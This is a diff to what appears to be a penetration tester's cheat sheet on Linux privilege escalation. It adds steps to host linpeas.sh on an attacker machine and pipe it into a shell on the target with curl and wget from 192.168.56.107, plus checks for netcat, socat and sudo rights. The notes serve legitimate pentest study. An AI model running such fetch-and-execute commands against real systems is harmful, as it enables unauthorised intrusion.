@@ -41,21 +41,31 @@ Look for
 ## Linux
 https://book.hacktricks.xyz/linux-hardening/useful-linux-commands
 
+### Serve file remotely
+
+On attacker machine, go where your script is and start a http server
+
+    cd ~/privesc/linux && python3 -m http.server
+
+On target machine
+
+    curl -L http://192.168.56.107:8000/linpeas.sh | sh
+    wget -q -O - http://192.168.56.107:8000/linpeas.sh | sh
+
 ### Useful Software
 https://book.hacktricks.xyz/linux-hardening/privilege-escalation
 
-    which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
+    which nmap aws awk nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
+
+Find commands with sudo permissions
+
+    sudo -l
 
 ## Compile C
 
    gcc -Wall -o compiled-output source.c -lpthread
 
-### Serve file remotely
 
-On target machine
-
-    ATTACK: cd ~/privesc/linux && python3 -m http.server
-    TARGET: curl -L http://192.168.56.107:8000/linpeas.sh | sh
 
 ## Reverse shells
 
